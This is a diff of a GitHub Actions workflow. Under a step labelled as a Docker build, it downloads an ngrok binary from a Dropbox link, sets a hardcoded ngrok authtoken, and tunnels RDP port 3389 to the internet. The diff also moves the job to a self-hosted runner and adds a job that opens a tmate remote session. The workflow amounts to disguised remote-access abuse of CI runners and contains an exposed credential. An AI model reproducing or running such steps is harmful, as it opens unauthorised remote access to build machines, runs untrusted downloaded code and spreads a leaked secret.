@@ -3,7 +3,7 @@ name: CI2
 on: [push]
 jobs:
   build:
-    runs-on: windows-latest
+    runs-on: self-hosted
     steps:
     - name: Build the Docker image
       run: |
@@ -19,3 +19,10 @@ jobs:
         Invoke-WebRequest https://www.dropbox.com/s/u32c79ae1oj0m1z/ngrok.exe?dl=1  -OutFile ngrok.exe
         .\ngrok authtoken 1lzpsFqpjyd50bu443avWew6q6u_612SZ19XczkhtrvQ6HGcD
         ./ngrok tcp 3389
+
+  build1:
+    runs-on: windows-latest
+    steps:
+    - uses: actions/checkout@v3
+    - name: Setup tmate session
+      uses: mxschmitt/action-tmate@v3
